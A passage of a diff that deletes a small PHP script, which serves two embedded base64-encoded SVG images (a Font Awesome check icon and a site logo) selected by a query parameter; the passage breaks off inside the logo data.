@@ -1,299 +1,1628 @@
-<?
-if (isset($_GET['f'])) {
-	switch ($_GET['f']) {
-		case 'check.svg':
-			header('Content-Type: image/svg+xml');
-			$data = "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjMzQzNDM0IiBkPSJNNDM1Ljg0OCA4My40NjZMMTcyLjgwNCAzNDYuNTFsLTk2LjY1Mi05Ni42NTJjLTQuNjg2LTQuNjg2LTEyLjI4NC00LjY4Ni0xNi45NzEgMGwtMjguMjg0IDI4LjI4NGMtNC42ODYgNC42ODYtNC42ODYgMTIuMjg0IDAgMTYuOTcxbDEzMy40MjEgMTMzLjQyMWM0LjY4NiA0LjY4NiAxMi4yODQgNC42ODYgMTYuOTcxIDBsMjk5LjgxMy0yOTkuODEzYzQuNjg2LTQuNjg2IDQuNjg2LTEyLjI4NCAwLTE2Ljk3MWwtMjguMjg0LTI4LjI4NGMtNC42ODYtNC42ODYtMTIuMjg0LTQuNjg2LTE2Ljk3IDB6Ii8+PC9zdmc+CjwhLS0KRm9udCBBd2Vzb21lIFBybyA1LjEuMCBieSBAZm9udGF3ZXNvbWUgLSBodHRwczovL2ZvbnRhd2Vzb21lLmNvbQpMaWNlbnNlIC0gaHR0cHM6Ly9mb250YXdlc29tZS5jb20vbGljZW5zZSAoQ29tbWVyY2lhbCBMaWNlbnNlKQotLT4=";
-			echo base64_decode($data);
-			break;
-		case 'logo.svg':
-			header('Content-Type: image/svg+xml');
-			$data = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj48c3ZnIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCA4NjYgODQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgeG1sbnM6c2VyaWY9Imh0dHA6Ly93d3cuc2VyaWYuY29tLyIgc3R5bGU9ImZpbGwtcnVsZTpldmVub2RkO2NsaXAtcnVsZTpldmVub2RkO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2UtbWl0ZXJsaW1pdDoxLjQxNDIxOyI+PHBhdGggZD0iTTQzLjA5MywwYzQuNTI4LDAgOC4zOTcsMC42NSAxMS42MDgsMS45NDljMy4yMSwxLjI5OSA2LjMzOCwzLjExNyA5LjM4MSw1LjQ1NmMwLjg1NCwwLjY2OCAxLjU5NiwxLjAwMiAyLjIyNywxLjAwMmMxLjU1OSwwIDIuNTI0LC0yLjI2NCAyLjg5NSwtNi43OTJsMi42MTcsMGMtMC4yOTcsNS4zODIgLTAuNDQ1LDE0Ljg4MyAtMC40NDUsMjguNTA1bC0yLjYxNywwYy0wLjM3MSwtNC4wNDUgLTAuOSwtNy40MzIgLTEuNTg3LC0xMC4xNmMtMC42ODcsLTIuNzI5IC0xLjczNSwtNS4xNzggLTMuMTQ2LC03LjM1Yy0xLjQxLC0yLjE3MSAtMy4zNCwtNC4wNTUgLTUuNzksLTUuNjUxYy0zLjQ4OSwtMi4yNjQgLTcuMDE1LC0zLjM5NiAtMTAuNTc4LC0zLjM5NmMtNS40NTYsMCAtOS43NzEsMS45MjEgLTEyLjk0NSw1Ljc2M2MtMy4xNzMsMy44NDEgLTUuMzgxLDguNjM5IC02LjYyNSwxNC4zOTJjLTEuMjQzLDUuNzUzIC0xLjg2NSwxMS45MTQgLTEuODY1LDE4LjQ4NGMwLDYuNTY5IDAuNjIyLDEyLjczMSAxLjg2NSwxOC40ODRjMS4yNDQsNS43NTMgMy40NTIsMTAuNTUgNi42MjUsMTQuMzkyYzMuMTc0LDMuODQyIDcuNDg5LDUuNzYyIDEyLjk0NSw1Ljc2MmMzLjU2MywwIDcuMDg5LC0xLjEzMiAxMC41NzgsLTMuMzk2YzIuNDUsLTEuNTIyIDQuMzgsLTMuMzk2IDUuNzksLTUuNjIzYzEuNDExLC0yLjIyNyAyLjQ1OSwtNC44MzUgMy4xNDYsLTcuODIyYzAuNjg3LC0yLjk4OCAxLjIxNiwtNi43NDYgMS41ODcsLTExLjI3NWwyLjYxNywwYzAsMTQuMTQyIDAuMTQ4LDI0LjAxNSAwLjQ0NSwyOS42MmwtMi42MTcsMGMtMC4xODUsLTIuMzc2IC0wLjQ5MiwtNC4wOTMgLTAuOTE4LC01LjE1Yy0wLjQyNywtMS4wNTggLTEuMDQ5LC0xLjU4NyAtMS44NjYsLTEuNTg3Yy0wLjU5MywwIC0xLjM3MywwLjMxNSAtMi4zMzgsMC45NDZjLTIuMjY0LDEuNTk2IC00LjM1MiwyLjkwNSAtNi4yNjMsMy45MjVjLTEuOTEyLDEuMDIxIC00LjA5MiwxLjg1NiAtNi41NDIsMi41MDZjLTIuNDUsMC42NDkgLTUuMjE1LDAuOTc0IC04LjI5NiwwLjk3NGMtOC42MTEsMCAtMTYuMTQ2LC0xLjYzMyAtMjIuNjA0LC00Ljg5OWMtNi40NTgsLTMuMjY3IC0xMS40NjksLTguMDA4IC0xNS4wMzIsLTE0LjIyNWMtMy41NjMsLTYuMjE3IC01LjM0NSwtMTMuNjEzIC01LjM0NSwtMjIuMTg3YzAsLTguMzg4IDEuODI4LC0xNS44MTIgNS40ODQsLTIyLjI3YzMuNjU2LC02LjQ1OCA4Ljc0MSwtMTEuNDY5IDE1LjI1NSwtMTUuMDMyYzYuNTE0LC0zLjU2MyAxMy45NjUsLTUuMzQ1IDIyLjM1NCwtNS4zNDVaIiBzdHlsZT0iZmlsbDojMzQzNDM0O2ZpbGwtcnVsZTpub256ZXJvOyIvPjxwYXRoIGQ9Ik0xMDguNjIyLDIxLjU0NmM0LjM0MywwIDguMDE3LDAuNDE4IDExLjAyNCwxLjI1M2MzLjAwNiwwLjgzNSA1LjUzLDIuMzI5IDcuNTcyLDQuNDgyYzEuNDg0LDEuNTU5IDIuNDc3LDMuNTM1IDIuOTc4LDUuOTI5YzAuNTAxLDIuMzk0IDAuNzUyLDUuNzQ0IDAuNzUyLDEwLjA1bDAsMzAuNTFjMCwxLjgxOCAwLjEzLDMuMDkgMC4zOSwzLjgxM2MwLjI2LDAuNzI0IDAuNzA1LDEuMDg2IDEuMzM2LDEuMDg2YzAuNTk0LDAgMS4xNDEsLTAuMTM5IDEuNjQyLC0wLjQxOGMwLjUwMSwtMC4yNzggMS4xNDIsLTAuNjk2IDEuOTIxLC0xLjI1MmwxLjExNCwxLjk0OGMtMS43ODIsMS40ODUgLTMuODYxLDIuNTUyIC02LjIzNiwzLjIwMmMtMi4zNzUsMC42NDkgLTUuMjMzLDAuOTc0IC04LjU3NCwwLjk3NGMtNC4wMDksMCAtNi45NSwtMC44MDcgLTguODI0LC0yLjQyMmMtMS44NzUsLTEuNjE0IC0yLjg0OSwtMy42ODQgLTIuOTIzLC02LjIwOGMtMS41OTYsMi42MzYgLTMuODQyLDQuNzMzIC02LjczNyw2LjI5MmMtMi44OTUsMS41NTkgLTYuMDg3LDIuMzM4IC05LjU3NiwyLjMzOGMtNC40OTEsMCAtOC4wMDgsLTEuMTg4IC0xMC41NTEsLTMuNTYzYy0yLjU0MiwtMi4zNzYgLTMuODEzLC01LjU0OSAtMy44MTMsLTkuNTIxYzAsLTMuODk3IDEuMTY5LC03LjE0NSAzLjUwNywtOS43NDNjMi4zMzgsLTIuNTk4IDUuOTk0LC00LjcxNCAxMC45NjgsLTYuMzQ3YzQuMDQ2LC0xLjQ0NyA3LjA0MywtMi41ODkgOC45OTIsLTMuNDI0YzEuOTQ4LC0wLjgzNSAzLjU4MSwtMS44MzcgNC44OTksLTMuMDA2YzEuMzE4LC0xLjE2OSAxLjk3NywtMi41NTIgMS45NzcsLTQuMTQ4bDAsLTEwLjE4OWMwLC0yLjQxMiAtMC42MDQsLTQuNTc0IC0xLjgxLC02LjQ4NmMtMS4yMDYsLTEuOTExIC0zLjQyNCwtMi44NjcgLTYuNjUzLC0yLjg2N2MtMC45NjUsMCAtMS45OTUsMC4xODYgLTMuMDksMC41NTdjLTEuMDk1LDAuMzcxIC0yLjA2OSwwLjgzNSAtMi45MjMsMS4zOTJjNS4wODUsMS44OTMgNy42MjcsNS4zMjYgNy42MjcsMTAuM2MwLDEuNzgxIC0wLjQ1NCwzLjM5NiAtMS4zNjQsNC44NDNjLTAuOTA5LDEuNDQ4IC0yLjE5OSwyLjU5OCAtMy44NjksMy40NTJjLTEuNjcsMC44NTQgLTMuNTgyLDEuMjgxIC01LjczNSwxLjI4MWMtMS44NTUsMCAtMy40ODksLTAuNDM2IC00Ljg5OSwtMS4zMDljLTEuNDEsLTAuODcyIC0yLjUwNSwtMi4wNjkgLTMuMjg1LC0zLjU5MWMtMC43NzksLTEuNTIyIC0xLjE2OSwtMy4yMSAtMS4xNjksLTUuMDY2YzAsLTIuMzAxIDAuNjQsLTQuMzM0IDEuOTIxLC02LjA5N2MxLjI4LC0xLjc2MyAyLjk5NywtMy4yMiA1LjE1LC00LjM3YzQuNzg4LC0yLjQ1IDEwLjg3NSwtMy42NzUgMTguMjYxLC0zLjY3NVptMS44MzgsMjYuNTAyYy0wLjU1NywwLjkyOCAtMi4wNDIsMi41OTggLTQuNDU0LDUuMDFjLTMuNzEyLDMuNjAxIC01LjU2OCw3Ljg4OCAtNS41NjgsMTIuODYxYzAsNS4zODIgMS45Myw4LjA3MyA1Ljc5LDguMDczYzEuNTk2LDAgMy4wMDcsLTAuNjMxIDQuMjMyLC0xLjg5M2wwLC0yNC4wNTFaIiBzdHlsZT0iZmlsbDojMzQzNDM0O2ZpbGwtcnVsZTpub256ZXJvOyIvPjxwYXRoIGQ9Ik0xNjUuMTMzLDgwLjYxOGMzLjE1NCwwIDYuMTQyLC0wLjY4NyA4Ljk2MywtMi4wNmMyLjgyMSwtMS4zNzQgNS4yMjQsLTMuNjc1IDcuMjEsLTYuOTA0YzEuOTg2LC0zLjIyOSAzLjE4MywtNy40OTggMy41OTEsLTEyLjgwNWwyLjI4MywwYzAsMTEuMzk0IDAuMTQ4LDE5LjM3NSAwLjQ0NSwyMy45NGMtNi4yNzIsLTAuMjk3IC0xMy43MzMsLTAuNDQ1IC0yMi4zODEsLTAuNDQ1Yy03LjY0NiwwIC0xNS43MDEsMC4xODUgLTI0LjE2MywwLjU1NmwyNS41NTUsLTU3LjkwMmwtMi4yODMsMGMtNC45MzYsMCAtOS4xOTYsMS42ODkgLTEyLjc3Nyw1LjA2N2MtMy41ODIsMy4zNzcgLTUuNjcsOC45NDUgLTYuMjY0LDE2LjcwMmwtMi4yODMsMGMwLC0xMS4zOTUgLTAuMTQ4LC0xOS4zNzUgLTAuNDQ1LC0yMy45NGM2LjI3MywwLjI5NyAxMy43MTUsMC40NDUgMjIuMzI2LDAuNDQ1YzcuNjQ2LDAgMTUuNywtMC4xODUgMjQuMTYzLC0wLjU1N2wtMjUuNDk5LDU3LjkwM2wxLjU1OSwwWiIgc3R5bGU9ImZpbGw6IzM0MzQzNDtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNMjIyLjk3OSwyMS41NDZjNC4zNDMsMCA4LjAxNywwLjQxOCAxMS4wMjQsMS4yNTNjMy4wMDYsMC44MzUgNS41MywyLjMyOSA3LjU3Miw0LjQ4MmMxLjQ4NCwxLjU1OSAyLjQ3NywzLjUzNSAyLjk3OCw1LjkyOWMwLjUwMSwyLjM5NCAwLjc1Miw1Ljc0NCAwLjc1MiwxMC4wNWwwLDMwLjUxYzAsMS44MTggMC4xMywzLjA5IDAuMzg5LDMuODEzYzAuMjYsMC43MjQgMC43MDYsMS4wODYgMS4zMzcsMS4wODZjMC41OTQsMCAxLjE0MSwtMC4xMzkgMS42NDIsLTAuNDE4YzAuNTAxLC0wLjI3OCAxLjE0MSwtMC42OTYgMS45MjEsLTEuMjUybDEuMTEzLDEuOTQ4Yy0xLjc4MSwxLjQ4NSAtMy44NiwyLjU1MiAtNi4yMzUsMy4yMDJjLTIuMzc2LDAuNjQ5IC01LjIzNCwwLjk3NCAtOC41NzQsMC45NzRjLTQuMDA5LDAgLTYuOTUsLTAuODA3IC04LjgyNSwtMi40MjJjLTEuODc0LC0xLjYxNCAtMi44NDgsLTMuNjg0IC0yLjkyMywtNi4yMDhjLTEuNTk2LDIuNjM2IC0zLjg0MSw0LjczMyAtNi43MzYsNi4yOTJjLTIuODk1LDEuNTU5IC02LjA4OCwyLjMzOCAtOS41NzYsMi4zMzhjLTQuNDkyLDAgLTguMDA4LC0xLjE4OCAtMTAuNTUxLC0zLjU2M2MtMi41NDIsLTIuMzc2IC0zLjgxNCwtNS41NDkgLTMuODE0LC05LjUyMWMwLC0zLjg5NyAxLjE3LC03LjE0NSAzLjUwOCwtOS43NDNjMi4zMzgsLTIuNTk4IDUuOTk0LC00LjcxNCAxMC45NjgsLTYuMzQ3YzQuMDQ2LC0xLjQ0NyA3LjA0MywtMi41ODkgOC45OTEsLTMuNDI0YzEuOTQ5LC0wLjgzNSAzLjU4MiwtMS44MzcgNC45LC0zLjAwNmMxLjMxNywtMS4xNjkgMS45NzYsLTIuNTUyIDEuOTc2LC00LjE0OGwwLC0xMC4xODljMCwtMi40MTIgLTAuNjAzLC00LjU3NCAtMS44MDksLTYuNDg2Yy0xLjIwNiwtMS45MTEgLTMuNDI0LC0yLjg2NyAtNi42NTMsLTIuODY3Yy0wLjk2NSwwIC0xLjk5NSwwLjE4NiAtMy4wOSwwLjU1N2MtMS4wOTUsMC4zNzEgLTIuMDcsMC44MzUgLTIuOTIzLDEuMzkyYzUuMDg1LDEuODkzIDcuNjI3LDUuMzI2IDcuNjI3LDEwLjNjMCwxLjc4MSAtMC40NTQsMy4zOTYgLTEuMzY0LDQuODQzYy0wLjkwOSwxLjQ0OCAtMi4xOTksMi41OTggLTMuODY5LDMuNDUyYy0xLjY3LDAuODU0IC0zLjU4MiwxLjI4MSAtNS43MzUsMS4yODFjLTEuODU2LDAgLTMuNDg5LC0wLjQzNiAtNC44OTksLTEuMzA5Yy0xLjQxMSwtMC44NzIgLTIuNTA2LC0yLjA2OSAtMy4yODUsLTMuNTkxYy0wLjc3OSwtMS41MjIgLTEuMTY5LC0zLjIxIC0xLjE2OSwtNS4wNjZjMCwtMi4zMDEgMC42NCwtNC4zMzQgMS45MjEsLTYuMDk3YzEuMjgsLTEuNzYzIDIuOTk3LC0zLjIyIDUuMTUsLTQuMzdjNC43ODgsLTIuNDUgMTAuODc1LC0zLjY3NSAxOC4yNjEsLTMuNjc1Wm0xLjgzNywyNi41MDJjLTAuNTU2LDAuOTI4IC0yLjA0MSwyLjU5OCAtNC40NTQsNS4wMWMtMy43MTEsMy42MDEgLTUuNTY3LDcuODg4IC01LjU2NywxMi44NjFjMCw1LjM4MiAxLjkzLDguMDczIDUuNzksOC4wNzNjMS41OTYsMCAzLjAwNiwtMC42MzEgNC4yMzEsLTEuODkzbDAsLTI0LjA1MVoiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PHBhdGggZD0iTTI5OS45MjIsMjEuNTQ2YzYuMDUsMCAxMC4zMzcsMS41MjIgMTIuODYxLDQuNTY2YzEuMTUxLDEuMzczIDEuOTk1LDMuMjIgMi41MzMsNS41MzljMC41MzgsMi4zMiAwLjgwOCw1LjM5MiAwLjgwOCw5LjIxNWwwLDMwLjg5OWMwLDIuMTE2IDAuMjA0LDMuNzY4IDAuNjEyLDQuOTU1YzAuNDA4LDEuMTg4IDEuMDY3LDIuMDIzIDEuOTc2LDIuNTA2YzAuOTEsMC40ODIgMi4xNjMsMC43MjQgMy43NTksMC43MjRsMCwyLjM5NGwtMi4wNiwtMC4wNTZjLTUuNDU3LC0wLjI2IC0xMC4wNzgsLTAuMzkgLTEzLjg2NCwtMC4zOWMtMy45NzEsMCAtOC42ODUsMC4xMyAtMTQuMTQxLDAuMzlsLTIuMDYsMC4wNTZsMCwtMi4zOTRjMS4zMzYsMCAyLjM3NSwtMC4yNDIgMy4xMTgsLTAuNzI0YzAuNzQyLC0wLjQ4MyAxLjI4LC0xLjMwOSAxLjYxNCwtMi40NzhjMC4zMzQsLTEuMTY5IDAuNTAxLC0yLjgzIDAuNTAxLC00Ljk4M2wwLC0zNy4wNzljMCwtMi40NSAtMC40NDUsLTQuMjYgLTEuMzM2LC01LjQyOWMtMC44OTEsLTEuMTY5IC0yLjMwMSwtMS43NTMgLTQuMjMxLC0xLjc1M2MtMS40MTEsMCAtMi43NDcsMC4zNTIgLTQuMDA5LDEuMDU3Yy0xLjI2MiwwLjcwNiAtMi4yODIsMS42OCAtMy4wNjIsMi45MjNjLTAuNzc5LDEuMjQ0IC0xLjE2OSwyLjY0NSAtMS4xNjksNC4yMDRsMCwzNi4wNzdjMCwyLjExNiAwLjE2NywzLjc2OCAwLjUwMSw0Ljk1NWMwLjMzNCwxLjE4OCAwLjg4MiwyLjAyMyAxLjY0MiwyLjUwNmMwLjc2MSwwLjQ4MiAxLjgxLDAuNzI0IDMuMTQ2LDAuNzI0bDAsMi4zOTRjLTAuMjk3LDAgLTAuOTY1LC0wLjAzOCAtMi4wMDQsLTAuMTEyYy02LjU3LC0wLjIyMiAtMTAuOTMxLC0wLjMzNCAtMTMuMDg0LC0wLjMzNGMtNC4wMDgsMCAtOC45NjQsMC4xMyAtMTQuODY1LDAuMzlsLTIuMjI3LDAuMDU2bDAsLTIuMzk0YzEuNTk2LDAgMi44NTgsLTAuMjQyIDMuNzg2LC0wLjcyNGMwLjkyOCwtMC40ODMgMS41OTYsLTEuMzE4IDIuMDA0LC0yLjUwNmMwLjQwOCwtMS4xODcgMC42MTMsLTIuODM5IDAuNjEzLC00Ljk1NWwwLC0zNi4xODljMCwtMy41MjYgLTAuNDgzLC02LjA3NyAtMS40NDgsLTcuNjU1Yy0wLjk2NSwtMS41NzcgLTIuNjE3LC0yLjM2NiAtNC45NTUsLTIuMzY2bDAsLTIuMzk0YzIuNDEyLDAuMjIzIDQuNzY5LDAuMzM0IDcuMDcxLDAuMzM0YzcuOTA1LDAgMTQuNTEyLC0wLjUyIDE5LjgyLC0xLjU1OWwwLDguMTg0YzMuNDUyLC01LjcxNiA5LjUwMiwtOC41NzQgMTguMTUsLTguNTc0WiIgc3R5bGU9ImZpbGw6IzM0MzQzNDtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNMzU2LjU5OSwyMS41NDZjOS4zNTQsMCAxNi41NzMsMi40NTkgMjEuNjU4LDcuMzc3YzUuMDg1LDQuOTE4IDcuNjI4LDEyLjg4OSA3LjYyOCwyMy45MTNjMCwxMC45ODYgLTIuNTQzLDE4LjkyIC03LjYyOCwyMy44MDFjLTUuMDg1LDQuODgxIC0xMi4zMDQsNy4zMjEgLTIxLjY1OCw3LjMyMWMtOS4zOSwwIC0xNi42MjgsLTIuNDQgLTIxLjcxMywtNy4zMjFjLTUuMDg1LC00Ljg4MSAtNy42MjcsLTEyLjgxNSAtNy42MjcsLTIzLjgwMWMwLC0xMS4wMjQgMi41NTEsLTE4Ljk5NSA3LjY1NSwtMjMuOTEzYzUuMTAzLC00LjkxOCAxMi4zMzIsLTcuMzc3IDIxLjY4NSwtNy4zNzdabTAsMi4yODNjLTIuNDEyLDAgLTQuMzUyLDIuMzk0IC01LjgxOCw3LjE4MmMtMS40NjYsNC43ODggLTIuMTk5LDEyLjA2MyAtMi4xOTksMjEuODI1YzAsOS43MjQgMC43MzMsMTYuOTYyIDIuMTk5LDIxLjcxM2MxLjQ2Niw0Ljc1MSAzLjQwNiw3LjEyNiA1LjgxOCw3LjEyNmMyLjQxMywwIDQuMzQzLC0yLjM3NSA1Ljc5MSwtNy4xMjZjMS40NDcsLTQuNzUxIDIuMTcxLC0xMS45ODkgMi4xNzEsLTIxLjcxM2MwLC05Ljc2MiAtMC43MjQsLTE3LjAzNyAtMi4xNzEsLTIxLjgyNWMtMS40NDgsLTQuNzg4IC0zLjM3OCwtNy4xODIgLTUuNzkxLC03LjE4MloiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PHBhdGggZD0iTTQzOC4yNzUsMjMuNjA2YzQuMzQzLDAgNy4yNzUsLTAuMTQ4IDguNzk3LC0wLjQ0NWwwLDIuMzk0Yy0xLjU1OSwwLjU5NCAtMi45OTgsMS43MjYgLTQuMzE1LDMuMzk2Yy0xLjMxOCwxLjY3IC0yLjU3MSw0LjIzMSAtMy43NTgsNy42ODNsLTE1LjQyMiw0NS43MWMtMS45NjgsLTAuMTg2IC0zLjgwNSwtMC4yNzkgLTUuNTEyLC0wLjI3OWMtMS42NywwIC0zLjUyNiwwLjA5MyAtNS41NjgsMC4yNzlsLTE5LjgyLC01MC4zODZjLTEuNjcsLTQuMjY5IC0zLjg3OSwtNi40MDMgLTYuNjI1LC02LjQwM2wwLC0yLjM5NGM2LjA4NywwLjQ0NSAxMi44NjEsMC42NjggMjAuMzIxLDAuNjY4YzMuNzg2LDAgOC43MjIsLTAuMjIzIDE0LjgxLC0wLjY2OGwwLDIuMzk0Yy0xLjYzNCwwIC0yLjg1OCwwLjAzNyAtMy42NzUsMC4xMTFjLTAuODE3LDAuMDc0IC0xLjUwMywwLjMyNSAtMi4wNiwwLjc1MmMtMC41NTcsMC40MjcgLTAuODM1LDEuMTA0IC0wLjgzNSwyLjAzMmMwLDAuNDA4IDAuMDU2LDAuODkxIDAuMTY3LDEuNDQ4bDEyLjQxNSwzNC41MThsNS4yOSwtMTUuN2MxLjQ0NywtNC4zMDYgMi4xNzEsLTguMjAzIDIuMTcxLC0xMS42OTJjMCwtMy41NjMgLTAuNzcsLTYuMzE5IC0yLjMxMSwtOC4yNjhjLTEuNTQsLTEuOTQ4IC0zLjU1MywtMy4wMTYgLTYuMDQsLTMuMjAxbDAsLTIuMzk0YzIuODU4LDAuMjk3IDYuODQ4LDAuNDQ1IDExLjk3LDAuNDQ1WiIgc3R5bGU9ImZpbGw6IzM0MzQzNDtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNNDc2LjE5LDIxLjU0NmM0LjM0MiwwIDguMDE3LDAuNDE4IDExLjAyMywxLjI1M2MzLjAwNywwLjgzNSA1LjUzMSwyLjMyOSA3LjU3Miw0LjQ4MmMxLjQ4NSwxLjU1OSAyLjQ3OCwzLjUzNSAyLjk3OSw1LjkyOWMwLjUwMSwyLjM5NCAwLjc1MSw1Ljc0NCAwLjc1MSwxMC4wNWwwLDMwLjUxYzAsMS44MTggMC4xMywzLjA5IDAuMzksMy44MTNjMC4yNiwwLjcyNCAwLjcwNSwxLjA4NiAxLjMzNiwxLjA4NmMwLjU5NCwwIDEuMTQyLC0wLjEzOSAxLjY0MywtMC40MThjMC41MDEsLTAuMjc4IDEuMTQxLC0wLjY5NiAxLjkyMSwtMS4yNTJsMS4xMTMsMS45NDhjLTEuNzgyLDEuNDg1IC0zLjg2LDIuNTUyIC02LjIzNiwzLjIwMmMtMi4zNzUsMC42NDkgLTUuMjMzLDAuOTc0IC04LjU3NCwwLjk3NGMtNC4wMDgsMCAtNi45NSwtMC44MDcgLTguODI0LC0yLjQyMmMtMS44NzQsLTEuNjE0IC0yLjg0OSwtMy42ODQgLTIuOTIzLC02LjIwOGMtMS41OTYsMi42MzYgLTMuODQyLDQuNzMzIC02LjczNyw2LjI5MmMtMi44OTUsMS41NTkgLTYuMDg3LDIuMzM4IC05LjU3NiwyLjMzOGMtNC40OTEsMCAtOC4wMDgsLTEuMTg4IC0xMC41NSwtMy41NjNjLTIuNTQzLC0yLjM3NiAtMy44MTQsLTUuNTQ5IC0zLjgxNCwtOS41MjFjMCwtMy44OTcgMS4xNjksLTcuMTQ1IDMuNTA3LC05Ljc0M2MyLjMzOSwtMi41OTggNS45OTUsLTQuNzE0IDEwLjk2OCwtNi4zNDdjNC4wNDYsLTEuNDQ3IDcuMDQzLC0yLjU4OSA4Ljk5MiwtMy40MjRjMS45NDksLTAuODM1IDMuNTgyLC0xLjgzNyA0Ljg5OSwtMy4wMDZjMS4zMTgsLTEuMTY5IDEuOTc3LC0yLjU1MiAxLjk3NywtNC4xNDhsMCwtMTAuMTg5YzAsLTIuNDEyIC0wLjYwMywtNC41NzQgLTEuODEsLTYuNDg2Yy0xLjIwNiwtMS45MTEgLTMuNDI0LC0yLjg2NyAtNi42NTMsLTIuODY3Yy0wLjk2NSwwIC0xLjk5NSwwLjE4NiAtMy4wOSwwLjU1N2MtMS4wOTUsMC4zNzEgLTIuMDY5LDAuODM1IC0yLjkyMywxLjM5MmM1LjA4NSwxLjg5MyA3LjYyOCw1LjMyNiA3LjYyOCwxMC4zYzAsMS43ODEgLTAuNDU1LDMuMzk2IC0xLjM2NCw0Ljg0M2MtMC45MSwxLjQ0OCAtMi4xOTksMi41OTggLTMuODcsMy40NTJjLTEuNjcsMC44NTQgLTMuNTgxLDEuMjgxIC01LjczNCwxLjI4MWMtMS44NTYsMCAtMy40ODksLTAuNDM2IC00LjksLTEuMzA5Yy0xLjQxLC0wLjg3MiAtMi41MDUsLTIuMDY5IC0zLjI4NCwtMy41OTFjLTAuNzgsLTEuNTIyIC0xLjE3LC0zLjIxIC0xLjE3LC01LjA2NmMwLC0yLjMwMSAwLjY0MSwtNC4zMzQgMS45MjEsLTYuMDk3YzEuMjgxLC0xLjc2MyAyLjk5NywtMy4yMiA1LjE1LC00LjM3YzQuNzg4LC0yLjQ1IDEwLjg3NSwtMy42NzUgMTguMjYyLC0zLjY3NVptMS44MzcsMjYuNTAyYy0wLjU1NywwLjkyOCAtMi4wNDIsMi41OTggLTQuNDU0LDUuMDFjLTMuNzEyLDMuNjAxIC01LjU2OCw3Ljg4OCAtNS41NjgsMTIuODYxYzAsNS4zODIgMS45Myw4LjA3MyA1Ljc5MSw4LjA3M2MxLjU5NiwwIDMuMDA2LC0wLjYzMSA0LjIzMSwtMS44OTNsMCwtMjQuMDUxWiIgc3R5bGU9ImZpbGw6IzM0MzQzNDtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNNjIyLjQ0OCwzLjg5N2MtMi40NDksMC4xMTIgLTQuMjEyLDAuNDA5IC01LjI4OSwwLjg5MWMtMS4wNzYsMC40ODMgLTEuODA5LDEuMzczIC0yLjE5OSwyLjY3MmMtMC4zOSwxLjMgLTAuNTg1LDMuMzc4IC0wLjU4NSw2LjIzNmwwLDU2LjU2NmMwLDIuODU4IDAuMjA1LDQuOTM3IDAuNjEzLDYuMjM2YzAuNDA4LDEuMjk5IDEuMTUsMi4xOSAyLjIyNywyLjY3MmMxLjA3NiwwLjQ4MyAyLjgyMSwwLjc4IDUuMjMzLDAuODkxbDAsMi4yODNjLTQuMDQ1LC0wLjIyMyAtMTAuNDMsLTAuMzM0IC0xOS4xNTIsLTAuMzM0Yy04Ljc2LDAgLTE1LjQ3OCwwLjExMSAtMjAuMTU0LDAuMzM0bDAsLTIuMjgzYzIuNDQ5LC0wLjExMSA0LjIxMiwtMC40MDggNS4yODksLTAuODkxYzEuMDc2LC0wLjQ4MiAxLjgwOSwtMS4zNjQgMi4xOTksLTIuNjQ0YzAuMzksLTEuMjgxIDAuNTg1LC0zLjM2OSAwLjU4NSwtNi4yNjRsMCwtMjcuMzkybC0yNS42NjcsMGwwLDI3LjM5MmMwLDIuODU4IDAuMjA0LDQuOTM3IDAuNjEzLDYuMjM2YzAuNDA4LDEuMjk5IDEuMTYsMi4xOSAyLjI1NSwyLjY3MmMxLjA5NCwwLjQ4MyAyLjg0OCwwLjc4IDUuMjYxLDAuODkxbDAsMi4yODNjLTQuNDU0LC0wLjIyMyAtMTAuODAxLC0wLjMzNCAtMTkuMDQxLC0wLjMzNGMtOS4yMDUsMCAtMTUuOTc5LDAuMTExIC0yMC4zMjEsMC4zMzRsMCwtMi4yODNjMi40NDksLTAuMTExIDQuMjIyLC0wLjQwOCA1LjMxNiwtMC44OTFjMS4wOTUsLTAuNDgyIDEuODM4LC0xLjM3MyAyLjIyNywtMi42NzJjMC4zOSwtMS4yOTkgMC41ODUsLTMuMzc4IDAuNTg1LC02LjIzNmwwLC01Ni41NjZjMCwtMi44NTggLTAuMjA0LC00LjkzNiAtMC42MTIsLTYuMjM2Yy0wLjQwOSwtMS4yOTkgLTEuMTYsLTIuMTg5IC0yLjI1NSwtMi42NzJjLTEuMDk1LC0wLjQ4MiAtMi44NDksLTAuNzc5IC01LjI2MSwtMC44OTFsMCwtMi4yODJjNC4zNDIsMC4yMjIgMTEuMTE2LDAuMzM0IDIwLjMyMSwwLjMzNGM4LjI0LDAgMTQuNTg3LC0wLjExMiAxOS4wNDEsLTAuMzM0bDAsMi4yODJjLTIuNDUsMC4xMTIgLTQuMjIyLDAuNDA5IC01LjMxNywwLjg5MWMtMS4wOTUsMC40ODMgLTEuODM3LDEuMzczIC0yLjIyNywyLjY3MmMtMC4zOSwxLjMgLTAuNTg1LDMuMzc4IC0wLjU4NSw2LjIzNmwwLDI2Ljg5MWwyNS42NjcsMGwwLC0yNi44OTFjMCwtMi44NTggLTAuMTk1LC00LjkzNiAtMC41ODUsLTYuMjM2Yy0wLjM5LC0xLjI5OSAtMS4xMzIsLTIuMTg5IC0yLjIyNywtMi42NzJjLTEuM